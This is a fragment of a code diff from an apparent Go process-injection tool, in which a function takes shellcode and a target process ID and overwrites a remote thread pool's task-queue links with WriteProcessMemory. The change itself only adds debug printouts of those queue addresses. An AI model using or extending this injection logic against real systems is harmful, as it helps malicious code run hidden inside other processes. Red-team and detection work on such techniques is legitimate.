@@ -565,6 +565,10 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	targetTaskQueueAddr = targetTpPool.TaskQueue[TP_CALLBACK_PRIORITY_HIGH]
 	targetQueueListAddr = targetTaskQueueAddr + uintptr(unsafe.Offsetof(targetQueue.Queue))
 	
+	output += fmt.Sprintf("[*] Debug: remoteWorkItemTaskListAddr = 0x%X\n", remoteWorkItemTaskListAddr)
+	output += fmt.Sprintf("[*] Debug: targetQueueListAddr (Flink addr) = 0x%X\n", targetQueueListAddr)
+	output += fmt.Sprintf("[*] Debug: targetQueueListAddr+8 (Blink addr) = 0x%X\n", targetQueueListAddr+8)
+	
 	// Update the target queue's Flink to point to our TP_WORK
 	ret, _, err = procWriteProcessMemory.Call(
 		uintptr(hProcess),
